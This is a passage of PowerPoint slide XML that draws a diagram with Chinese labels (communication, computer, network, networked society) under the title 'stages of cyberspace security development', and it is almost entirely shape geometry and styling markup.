                  <a:lnTo>
                    <a:pt x="874" y="2484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="978" y="2526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1086" y="2564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1198" y="2596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1314" y="2622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1434" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1558" y="2654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1686" y="2660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1818" y="2658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1952" y="2650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2090" y="2632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2230" y="2608"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2374" y="2574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2542" y="2912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2544" y="2912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2820" y="1934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1868" y="1552"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2036" y="1894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1956" y="1914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="1928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1788" y="1936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1702" y="1938"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1616" y="1934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1528" y="1926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1442" y="1912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1356" y="1894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1272" y="1872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1188" y="1844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1108" y="1812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="1776"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="952" y="1736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="1692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="810" y="1646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="744" y="1596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="684" y="1542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="628" y="1486"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="578" y="1428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="532" y="1366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="494" y="1304"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="462" y="1238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="438" y="1170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="420" y="1102"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="410" y="1032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="410" y="960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="416" y="888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434" y="816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="460" y="742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="496" y="668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="544" y="592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="602" y="518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670" y="444"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="752" y="370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="950" y="226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1070" y="154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1202" y="84"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1348" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1244" y="0"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2820" y="1934"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2820" y="1934"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:schemeClr val="bg2"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="folHlink"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="5400000" scaled="1"/>
            </a:gradFill>
            <a:ln w="0">
              <a:noFill/>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst>
              <a:outerShdw dist="206741" dir="8249373" algn="ctr" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="50000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:endParaRPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="+mn-ea"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="52" name="Oval 5"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm rot="-723406">
              <a:off x="3195" y="3092"/>
              <a:ext cx="1008" cy="466"/>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53" name="Oval 6"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3154" y="2245"/>
              <a:ext cx="1184" cy="1203"/>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54" name="Oval 7"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3168" y="2255"/>
              <a:ext cx="1157" cy="1172"/>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55" name="Oval 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3180" y="2273"/>
              <a:ext cx="1100" cy="1096"/>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56" name="Oval 9"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3243" y="2323"/>
              <a:ext cx="979" cy="88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57" name="Text Box 10"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3323" y="2729"/>
              <a:ext cx="8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zh-CN" altLang="en-US" b="1"/>
                <a:t>网络化社会</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="58" name="Oval 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm rot="-772996">
              <a:off x="1614" y="2713"/>
              <a:ext cx="796" cy="426"/>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grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="59" name="Group 12"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1565" y="2024"/>
              <a:ext cx="952" cy="1016"/>
              <a:chOff x="732" y="2112"/>
              <a:chExt cx="842" cy="860"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="73" name="Oval 13"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="732" y="2112"/>
                <a:ext cx="842" cy="86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4" name="Oval 14"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="743" y="2117"/>
                <a:ext cx="821" cy="838"/>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5" name="Oval 15"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="751" y="2125"/>
                <a:ext cx="781" cy="784"/>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6" name="Oval 16"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="795" y="2147"/>
                <a:ext cx="695" cy="63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7" name="Text Box 17"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="965" y="2488"/>
                <a:ext cx="357"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zh-CN" altLang="en-US" b="1"/>
                  <a:t>网络</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="60" name="Oval 18"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1390" y="1611"/>
              <a:ext cx="635" cy="376"/>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61" name="Oval 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1442" y="1192"/>
              <a:ext cx="711" cy="72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62" name="Oval 20"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1451" y="1197"/>
              <a:ext cx="694" cy="705"/>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63" name="Oval 21"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1458" y="1209"/>
              <a:ext cx="660" cy="65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64" name="Oval 22"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1495" y="1238"/>
              <a:ext cx="589" cy="534"/>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65" name="Text Box 23"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1530" y="1498"/>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zh-CN" altLang="en-US" b="1"/>
                <a:t>计算机</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="66" name="Group 24"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="2290" y="754"/>
              <a:ext cx="729" cy="582"/>
              <a:chOff x="1584" y="960"/>
              <a:chExt cx="507" cy="480"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="68" name="Oval 25"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1584" y="1296"/>
                <a:ext cx="432" cy="144"/>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69" name="Oval 26"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1661" y="960"/>
                <a:ext cx="430" cy="43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0" name="Oval 27"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1667" y="962"/>
                <a:ext cx="419" cy="420"/>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1" name="Oval 28"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1671" y="966"/>
                <a:ext cx="399" cy="392"/>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2" name="Oval 29"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="gray">
              <a:xfrm>
                <a:off x="1694" y="978"/>
                <a:ext cx="355" cy="317"/>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grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="67" name="Text Box 30"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2200" y="799"/>
              <a:ext cx="102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zh-CN" altLang="en-US" b="1" dirty="0"/>
                <a:t>通信</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
                <a:t>（电报</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
                <a:t>\</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
                <a:t>电话）</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934244" y="764704"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全发展阶段</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="组合 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1090746" y="1751224"/>
            <a:ext cx="7346950" cy="4356484"/>
            <a:chOff x="1584325" y="1412875"/>
            <a:chExt cx="7346950" cy="4552950"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="Freeform 3"/>
            <p:cNvSpPr>
              <a:spLocks noEditPoints="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1584325" y="1927225"/>
              <a:ext cx="6438900" cy="4038600"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="0">
                  <a:pos x="1092" y="50"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="822" y="168"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="594" y="300"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="406" y="446"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="254" y="604"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="140" y="772"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="60" y="944"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="14" y="1122"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="0" y="1300"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="18" y="1476"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="64" y="1650"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="138" y="1818"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="238" y="1978"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="364" y="2126"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="512" y="2262"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="684" y="2382"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="874" y="2484"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1086" y="2564"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1314" y="2622"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1558" y="2654"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1818" y="2658"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="2090" y="2632"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="2374" y="2574"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="2544" y="2912"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1868" y="1552"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1956" y="1914"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1788" y="1936"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1616" y="1934"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1442" y="1912"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1272" y="1872"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1108" y="1812"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="952" y="1736"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="810" y="1646"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="684" y="1542"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="578" y="1428"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="494" y="1304"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="438" y="1170"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="410" y="1032"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="416" y="888"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="460" y="742"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="544" y="592"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="670" y="444"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="844" y="298"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1070" y="154"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1348" y="16"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="1244" y="0"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="2820" y="1934"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="2820" y="1934"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="0" t="0" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2820" h="2912">
                  <a:moveTo>
                    <a:pt x="1244" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1092" y="50"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="952" y="106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="822" y="168"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="704" y="232"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="594" y="300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="494" y="372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="406" y="446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="324" y="524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254" y="604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="192" y="686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="140" y="772"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96" y="856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="32" y="1032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="1122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="1210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="1388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="1476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36" y="1564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="1650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96" y="1736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="1818"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="1900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238" y="1978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="298" y="2054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="364" y="2126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434" y="2196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="512" y="2262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="596" y="2324"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="684" y="2382"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="776" y="2436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="874" y="2484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="978" y="2526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1086" y="2564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1198" y="2596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1314" y="2622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1434" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1558" y="2654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1686" y="2660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1818" y="2658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1952" y="2650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2090" y="2632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2230" y="2608"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2374" y="2574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2542" y="2912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2544" y="2912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2820" y="1934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1868" y="1552"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2036" y="1894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1956" y="1914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="1928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1788" y="1936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1702" y="1938"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1616" y="1934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1528" y="1926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1442" y="1912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1356" y="1894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1272" y="1872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1188" y="1844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1108" y="1812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="1776"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="952" y="1736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="1692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="810" y="1646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="744" y="1596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="684" y="1542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="628" y="1486"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="578" y="1428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="532" y="1366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="494" y="1304"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="462" y="1238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="438" y="1170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="420" y="1102"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="410" y="1032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="410" y="960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="416" y="888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434" y="816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="460" y="742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="496" y="668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="544" y="592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="602" y="518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670" y="444"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="752" y="370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="950" y="226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1070" y="154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1202" y="84"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1348" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1244" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1244" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1244" y="0"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2820" y="1934"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2820" y="1934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2820" y="1934"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:schemeClr val="accent1"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="hlink"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="5400000" scaled="1"/>
            </a:gradFill>
            <a:ln w="0">
              <a:noFill/>
              <a:prstDash val="solid"/>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst>
              <a:outerShdw dist="206741" dir="8249373" algn="ctr" rotWithShape="0">
                <a:srgbClr val="000000">
                  <a:alpha val="50000"/>
                </a:srgbClr>
              </a:outerShdw>
            </a:effectLst>
